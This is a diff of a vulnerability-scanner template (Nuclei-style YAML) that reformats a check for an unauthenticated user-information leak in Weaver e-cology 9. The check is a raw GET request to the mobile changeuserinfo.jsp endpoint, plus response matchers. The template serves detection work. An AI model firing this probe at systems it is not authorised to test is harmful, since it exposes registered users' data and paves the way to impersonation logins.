@@ -1,31 +1,50 @@
 id: weaver_e_cology9_Information_disclosure
 info:
-  name: weaver_e_cology9_Information_disclosure
   author: weehhd
-  severity: high
-  description: 由于系统未对系统接口的响应进行合理的处理，导致该系统会泄漏已注册用户信息，攻击者可利用信息泄露漏洞获取注册用户的信息。另外由于系统使用了不当的算法设计，导致攻击者可模拟任意用户登录系统。对攻击者来说，这两个漏洞的利用无需认证和鉴权，可通过组合漏洞获取用户数据，登录后台。
+  description: "\u7531\u4E8E\u7CFB\u7EDF\u672A\u5BF9\u7CFB\u7EDF\u63A5\u53E3\u7684\
+    \u54CD\u5E94\u8FDB\u884C\u5408\u7406\u7684\u5904\u7406\uFF0C\u5BFC\u81F4\u8BE5\
+    \u7CFB\u7EDF\u4F1A\u6CC4\u6F0F\u5DF2\u6CE8\u518C\u7528\u6237\u4FE1\u606F\uFF0C\
+    \u653B\u51FB\u8005\u53EF\u5229\u7528\u4FE1\u606F\u6CC4\u9732\u6F0F\u6D1E\u83B7\
+    \u53D6\u6CE8\u518C\u7528\u6237\u7684\u4FE1\u606F\u3002\u53E6\u5916\u7531\u4E8E\
+    \u7CFB\u7EDF\u4F7F\u7528\u4E86\u4E0D\u5F53\u7684\u7B97\u6CD5\u8BBE\u8BA1\uFF0C\
+    \u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u6A21\u62DF\u4EFB\u610F\u7528\u6237\u767B\
+    \u5F55\u7CFB\u7EDF\u3002\u5BF9\u653B\u51FB\u8005\u6765\u8BF4\uFF0C\u8FD9\u4E24\
+    \u4E2A\u6F0F\u6D1E\u7684\u5229\u7528\u65E0\u9700\u8BA4\u8BC1\u548C\u9274\u6743\
+    \uFF0C\u53EF\u901A\u8FC7\u7EC4\u5408\u6F0F\u6D1E\u83B7\u53D6\u7528\u6237\u6570\
+    \u636E\uFF0C\u767B\u5F55\u540E\u53F0\u3002"
+  name: weaver_e_cology9_Information_disclosure
   reference:
-    - https://
+  - https://
+  severity: high
   tags: tags
 requests:
-  - raw:
-      - |+
-        GET /mobile/plugin/changeuserinfo.jsp?type=getLoginid&mobile=0 HTTP/1.1
-        Host: {{Hostname}}
-        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-        Accept-Encoding: identity
-        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
-        Upgrade-Insecure-Requests: 1
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.58
-        Content-Length: 2
+- matchers:
+  - part: body
+    type: word
+    words:
+    - status
+  - part: header
+    type: word
+    words:
+    - 200 OK
+  matchers-condition: and
+  raw:
+  - 'GET /mobile/plugin/changeuserinfo.jsp?type=getLoginid&mobile=0 HTTP/1.1
 
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - status
-      - type: word
-        part: header
-        words:
-          - 200 OK
+    Host: {{Hostname}}
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: identity
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
+    (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.58
+
+    Content-Length: 2
+
+
+    '
